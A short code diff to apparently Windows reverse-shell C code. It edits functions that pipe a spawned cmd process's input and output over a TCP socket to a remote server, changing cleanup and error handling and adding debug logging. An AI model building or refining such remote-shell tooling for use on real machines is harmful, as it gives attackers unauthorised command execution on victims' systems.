@@ -30,10 +30,14 @@ void forwardToChildProcess(void* param) {
             DBGLG("Killing cmd\n");
             TerminateProcess(pi.hProcess, 9);
         }
-        exit(0);
+        return;
     } else {
         perror("recv failed");
     }
+
+    DBGLG("Killing cmd: ", WSAGetLastError());
+    TerminateProcess(pi.hProcess, 9);
+    return;
 }
 
 
@@ -84,10 +88,9 @@ int Shell(PROCESS_INFORMATION* pi, SOCKET sockfd) {
         // Send the received output to the server through the TCP socket
         send(sockfd, buffer, bytesRead, 0);
     }
-
     // Wait for the child process to exit
     WaitForSingleObject(pi->hProcess, INFINITE);
-
+    DBGLG("Exiting shell\n");
     // Close handles and clean up
     CloseHandle(hChildStdInWrite);
     CloseHandle(hChildStdOutRead);
